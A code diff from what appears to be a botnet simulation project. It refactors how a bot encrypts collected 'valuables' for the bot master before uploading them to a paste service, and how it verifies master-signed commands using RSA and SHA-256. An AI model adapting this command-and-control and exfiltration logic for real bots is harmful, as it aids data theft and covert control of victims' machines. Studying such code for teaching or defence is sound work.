@@ -1,8 +1,7 @@
 import os
-from Crypto.Cipher import PKCS1_v1_5
-from Crypto.PublicKey import RSA
-from Crypto.Hash import SHA
+from Crypto.Hash import SHA256
 from botMaster.RSASignVerify import RSASignAndVerify
+from botMaster.RSAEncrypterDecrypter import RSAEncrypterDecrypter
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -17,11 +16,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    h = SHA.new(data)
-    key = RSA.importKey(open('./PublicKeyDir.Keys/pubkeys.pem', 'rb').read())
-    cipher = PKCS1_v1_5.new(key)
-    ciphertext = cipher.encrypt(data+h.digest())
-    return ciphertext
+    return RSAEncrypterDecrypter().encrypt_using_master_public(data)
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -41,21 +36,29 @@ def upload_valuables_to_pastebot(fn):
 
 def verify_file(f):
     # Verify the file sent by the master using pycrypto verifier
-    signature,content = extract_signature_and_content(f)
-    if signature is None:
+    expected_message_length = 1024
+
+    if len(f) > expected_message_length or len(f) < 1024:
         return False
 
-    return RSASignAndVerify().verify_signature(content,signature)
+    size_of_message_or_signature = 512
+    signature = f[:size_of_message_or_signature]
+    message = f[size_of_message_or_signature:]
+    message = RSAEncrypterDecrypter().decrypt_using_bot_private(message)
+    return perform_verification(message, signature)
 
 
-def extract_signature_and_content(f):
-    extracted_file = f.split(bytes("===\n","ascii"))
+def perform_verification(message, signature):
+    digest_size = SHA256.digest_size
+    digest = SHA256.new(message[:-digest_size]).digest()
 
-    if len(extracted_file) > 1:
-        return extracted_file[0],extracted_file[1]
+    if digest == message[-digest_size:]:
+        return RSASignAndVerify().verify_signature(message[:-digest_size], signature)
 
     else:
-        return None,None
+        return False
+
+
 
 
 def process_file(fn, f):
